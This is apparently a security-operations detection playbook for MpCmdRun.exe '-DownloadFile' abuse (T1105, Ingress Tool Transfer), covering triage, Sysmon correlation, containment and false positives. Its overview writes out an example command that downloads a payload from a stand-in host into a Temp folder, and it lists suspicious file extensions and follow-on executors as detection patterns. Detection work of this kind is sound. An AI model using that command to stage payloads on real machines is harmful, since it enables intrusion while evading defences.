# T1105 — Ingress Tool Transfer · LOLBin: MpCmdRun.exe (Microsoft Defender CLI)
**Rules:**  
- CNC-E-2726320-169 — MpCmdRun DownloadFile URL Path (Process Creation)  
- CNC-E-2726320-169 — MpCmdRun FileCreate with Suspicious Extensions (Sysmon EID 11)  
**Last updated:** 2025-10-28 06:31 UTC

> `MpCmdRun.exe` is the **Microsoft Defender** command‑line utility. Adversaries abuse its **`-DownloadFile`** capability to fetch arbitrary
> content from **HTTP/HTTPS** to a chosen **local path**, leveraging a Microsoft‑signed binary to stage payloads (**T1105 — Ingress Tool Transfer**).
> Follow‑on misuse often writes executables/scripts to **user‑writable** directories and launches them.

---

## Playbook 1 — MpCmdRun DownloadFile URL Path (Process Creation)

### Overview
Investigate alerts where **`MpCmdRun.exe`** is launched with **`-DownloadFile`** and both **`-url`** and **`-path`** parameters, e.g.:  
`MpCmdRun.exe -DownloadFile -url https://example[.]com/payload.bin -path C:\\Users\\<user>\\AppData\\Local\\Temp\\payload.bin`  
This is a direct **payload retrieval** via a signed security tool and is frequently used in **LOLBin** abuse chains.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688**: `Image`, full `CommandLine`, `ParentImage`, `User`, integrity level, working dir, timestamp.  
2. **Parse indicators:** Extract **URL**, **destination path**, and any **raw IPs** or **non‑standard ports**. Classify destination as **internal/external**.  
3. **Secure artifacts:** Immediately **copy & hash** the downloaded file and any adjacent temp files. Do not execute.

### Investigation Steps
#### 1) Process & Lineage
- Verify `Image` path (`C:\\Program Files\Windows Defender\MpCmdRun.exe` or Defender platform path under `C:\\ProgramData\Microsoft\Windows Defender\Platform\*`).  
- Review `ParentImage` (Office, script hosts, browser, MSI installers, scheduled tasks) to determine the ingress vector.  
- Note repeated invocations or loops (batch abuse) and user context (interactive vs service).

#### 2) Command‑Line Semantics
- Confirm presence of `-DownloadFile` **with both** `-url` and `-path`.  
- Treat flags like `-DisableIntegrityCheck` (legacy), or odd casing/spaces, as noteworthy.  
- Record destination **directory**; **user‑writable** paths increase risk.

#### 3) Artifact & Content Analysis
- Classify file type (magic/headers): PE, script, archive, ISO, LNK, HTA, etc.  
- Check **extension ↔ MIME** consistency, **entropy**, and **strings/URLs**.  
- Submit to sandbox if policy allows; compute hashes; compare against threat intel and fleet prevalence.

#### 4) Network & DNS Corroboration
- Correlate **Sysmon EID 3** (if attributed to `MpCmdRun.exe`) and **Sysmon EID 22** DNS for the destination (or proxy FQDN with explicit proxy).  
- In some environments, Defender may broker operations through the **Antimalware Service**; cross‑check for **`MsMpEng.exe`** activity and proxy logs.

#### 5) Correlation & Follow‑On
- Hunt for **execution** of the downloaded file by `cmd`, `powershell`, `wscript`, `rundll32`, `mshta`, etc., within minutes.  
- Pivot fleet‑wide on the **URL/host**, file **hash**, and **command line** pattern to identify broader usage.

### Key Artifacts
- **Sysmon EID 1 / 4688:** `Image=...\\MpCmdRun.exe`, command line showing `-DownloadFile -url ... -path ...`.  
- **Sysmon EID 11:** Created file at `-path` (and adjacent temp files).  
- **Sysmon EID 3 / Proxy:** Outbound HTTP(S) to the `-url` host.  
- **Sysmon EID 22:** DNS lookups aligned with execution.  
- **EDR timeline:** Parentage and child processes post‑download.

### Containment Actions
- **Quarantine** downloaded payloads; **block** destination domain/IP; **terminate** active process chains.  
- Consider **host isolation** if execution or lateral movement confirmed.

### Prevention Measures
- Application control to **restrict `MpCmdRun.exe` usage** to administration contexts.  
- Egress filtering and **domain allowlists**; monitor for **rare process → URL** patterns.  
- Alert on `MpCmdRun.exe` writing to **user‑writable** directories and on subsequent **execution** from those paths.

### Recovery
- Remove staged content/persistence; rotate credentials if exposure suspected; tune allowlists/detections; document deviations.

### False Positives
- Incident response or **legitimate admin** workflows using Defender CLI for **artifact retrieval** from **approved** internal URLs. Validate via tickets/owners.

---

## Playbook 2 — MpCmdRun FileCreate with Suspicious Extensions (Sysmon EID 11)

### Overview
Investigate **file creation** events where `MpCmdRun.exe` writes **executable or script types** (e.g., `.exe`, `.dll`, `.ps1`, `.vbs`, `.js`, `.hta`, `.bat`, `.cmd`, `.lnk`, `.zip`, `.cab`, `.iso`) to **user‑writable** locations.
When preceded by `-DownloadFile`, this strongly indicates **T1105** staging.

### Initial Response
1. **Secure artifacts:** Copy and **hash** the created files; preserve timestamps and **owner** metadata.  
2. **Trace lineage:** Link the **EID 11** to prior `MpCmdRun.exe` **EID 1/4688** and any **EID 3/22** network activity.  
3. **Assess location:** Prioritize `%TEMP%`, `%USERPROFILE%`, `%APPDATA%`, `%PUBLIC%`, `Downloads`, and desktop‑like paths.

### Investigation Steps
#### 1) Artifact Inspection
- Determine true type via headers; check **extension ↔ MIME** mismatch and **entropy** for packed/encoded payloads.  
- Inspect **strings** for URLs, encoded data, or LOLBin chains; review **Zone.Identifier** ADS if present.

#### 2) Process Context
- Retrieve original `MpCmdRun.exe` **command line**; verify previous `-DownloadFile` usage and exact `-path`.  
- Review `ParentImage` and user context (interactive vs scheduled/service).

#### 3) Network & DNS Corroboration
- Correlate with **EID 3** to the host that served the file and **EID 22** DNS lookups (or proxy FQDN).  
- Examine **proxy** logs for request/response metadata (status, size, content‑type).

#### 4) Follow‑On & Fleet
- Hunt for **execution** of the created file; pivot hashes/paths across fleet; check for **lateral reuse** under other users/hosts.

### Key Artifacts
- **Sysmon EID 11:** `TargetFilename` created by `MpCmdRun.exe`.  
- **Sysmon EID 1 / 4688:** Prior process creation showing `-DownloadFile`.  
- **Sysmon EID 3 & 22 / Proxy:** Corroborating network/DNS telemetry.  
- **EDR timeline:** Child processes that execute the created artifact.

### Containment Actions
- **Quarantine** suspicious files; **block** related destinations; **terminate** process chains; consider **host isolation** if code execution confirmed.

### Prevention Measures
- Restrict Defender CLI usage; enforce **egress controls**; monitor for `MpCmdRun.exe` writing into **user‑writable** locations.  
- Alert on **rare process → file‑write** patterns and on **non‑standard** file types produced by security tooling.

### Recovery
- Remove artifacts/persistence; tune detections/allowlists; educate admins about safe Defender CLI usage.

### False Positives
- Admin/IR workflows that stage diagnostic packages or signatures using `MpCmdRun.exe` into temp paths. Validate with change tickets and owners.